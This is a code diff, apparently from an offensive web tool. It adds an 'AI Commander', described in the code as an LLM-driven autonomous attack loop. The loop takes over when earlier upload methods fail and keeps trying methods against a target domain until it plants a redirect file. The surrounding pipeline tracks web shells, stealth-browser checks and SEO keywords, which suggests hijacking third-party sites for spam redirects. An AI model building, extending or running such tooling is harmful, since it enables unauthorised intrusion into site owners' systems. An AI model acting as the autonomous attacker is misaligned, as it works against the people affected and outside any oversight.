@@ -23,6 +23,7 @@ import { getDb } from "./db";
 import { deployHistory } from "../drizzle/schema";
 import { eq } from "drizzle-orm";
 import { getDeployLearnings } from "./ai-learning";
+import { runAiCommander, type AiCommanderResult, type AiCommanderEvent } from "./ai-autonomous-engine";
 
 function parseSeoKeywords(input: unknown): string[] {
   if (!input) return [];
@@ -186,6 +187,8 @@ export function registerOneClickSSE(app: Express) {
       enableAltMethods,
       enableStealthBrowser,
       enableAiAnalysis,
+      enableAiCommander,
+      aiCommanderMaxIterations,
       methodPriority,
     } = req.body;
 
@@ -314,6 +317,7 @@ export function registerOneClickSSE(app: Express) {
     let stealthBrowserUsed = false;
     let preScreenResult: PreScreenResult | null = null;
     let aiTargetAnalysisResult: AiTargetAnalysis | null = null;
+    let aiCommanderResult: AiCommanderResult | null = null;
 
     // ═══════════════════════════════════════════════
     //  MAIN PIPELINE — wrapped in a master try/catch
@@ -710,6 +714,90 @@ export function registerOneClickSSE(app: Express) {
         }
       }
 
+      // ═══ AI COMMANDER — LLM-Driven Autonomous Attack Loop ═══
+      // Activates when all previous methods failed AND enableAiCommander is on
+      const allUploadsFailed = !result.shellInfo?.url && !altMethodUsed;
+      if (allUploadsFailed && enableAiCommander !== false) {
+        sendEvent({
+          type: "step_detail",
+          step: "ai_commander",
+          status: "running",
+          detail: `\u{1F916} AI Commander เริ่มทำงาน \u2014 LLM จะวิเคราะห์ target และหาวิธีทำจนกว่าจะสำเร็จ (max ${aiCommanderMaxIterations || 10} iterations)...`,
+        });
+
+        try {
+          aiCommanderResult = await runAiCommander({
+            targetDomain,
+            redirectUrl,
+            maxIterations: Math.min(aiCommanderMaxIterations || 10, 15),
+            timeoutPerAttempt: 15000,
+            seoKeywords: parsedKeywords,
+            onEvent: (event: AiCommanderEvent) => {
+              sendEvent({
+                type: "ai_commander" as any,
+                step: `ai_cmd_${event.type}_${event.iteration}`,
+                status: event.type === "success" ? "done" : event.type === "exhausted" ? "warning" : "running",
+                detail: event.detail,
+                data: {
+                  ...event.data,
+                  iteration: event.iteration,
+                  maxIterations: event.maxIterations,
+                  eventType: event.type,
+                },
+              });
+            },
+          });
+
+          if (aiCommanderResult.success && aiCommanderResult.uploadedUrl) {
+            altMethodUsed = `ai_commander_${aiCommanderResult.successfulMethod}`;
+            sendEvent({
+              type: "step_detail",
+              step: "ai_commander",
+              status: "done",
+              detail: `\u2705 AI Commander สำเร็จ! Upload ที่ ${aiCommanderResult.uploadedUrl} \u0e14\u0e49\u0e27\u0e22 ${aiCommanderResult.successfulMethod} (${aiCommanderResult.iterations} iterations, ${(aiCommanderResult.totalDurationMs / 1000).toFixed(1)}s)`,
+              data: {
+                uploadedUrl: aiCommanderResult.uploadedUrl,
+                method: aiCommanderResult.successfulMethod,
+                iterations: aiCommanderResult.iterations,
+                redirectVerified: aiCommanderResult.redirectVerified,
+                totalDuration: aiCommanderResult.totalDurationMs,
+              },
+            });
+
+            // Add to deployed files
+            result.deployedFiles = result.deployedFiles || [];
+            result.deployedFiles.push({
+              type: "redirect" as const,
+              filename: "ai-commander-upload",
+              url: aiCommanderResult.uploadedUrl,
+              status: "deployed" as const,
+              description: `AI Commander: ${aiCommanderResult.successfulMethod}`,
+            });
+            result.summary.successSteps = (result.summary.successSteps || 0) + 1;
+            result.summary.totalFilesDeployed = (result.summary.totalFilesDeployed || 0) + 1;
+          } else {
+            sendEvent({
+              type: "step_detail",
+              step: "ai_commander",
+              status: "warning",
+              detail: `\u26A0\uFE0F AI Commander \u0e2b\u0e21\u0e14 iterations (${aiCommanderResult.iterations}) \u2014 \u0e44\u0e21\u0e48\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16 upload \u0e44\u0e14\u0e49\u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08`,
+              data: {
+                iterations: aiCommanderResult.iterations,
+                methodsTried: aiCommanderResult.decisions.map(d => d.method),
+                totalDuration: aiCommanderResult.totalDurationMs,
+              },
+            });
+          }
+        } catch (e: any) {
+          sendEvent({
+            type: "step_detail",
+            step: "ai_commander",
+            status: "warning",
+            detail: `AI Commander error: ${e.message}`,
+          });
+        }
+      }
+
       // ─── Stealth Browser Post-Deploy Verification ───
       if (enableStealthBrowser !== false && browserAvailable && result.deployedFiles?.length > 0) {
         stealthBrowserUsed = true;
@@ -800,6 +888,17 @@ export function registerOneClickSSE(app: Express) {
       result.deployRecordId = deployRecordId;
       if (aiTargetAnalysisResult) {
         result.aiTargetAnalysis = aiTargetAnalysisResult;
+      }
+      if (aiCommanderResult) {
+        result.aiCommanderResult = {
+          success: aiCommanderResult.success,
+          iterations: aiCommanderResult.iterations,
+          successfulMethod: aiCommanderResult.successfulMethod,
+          uploadedUrl: aiCommanderResult.uploadedUrl,
+          redirectVerified: aiCommanderResult.redirectVerified,
+          totalDurationMs: aiCommanderResult.totalDurationMs,
+          decisionsCount: aiCommanderResult.decisions.length,
+        };
       }
       sendDone(result);
 
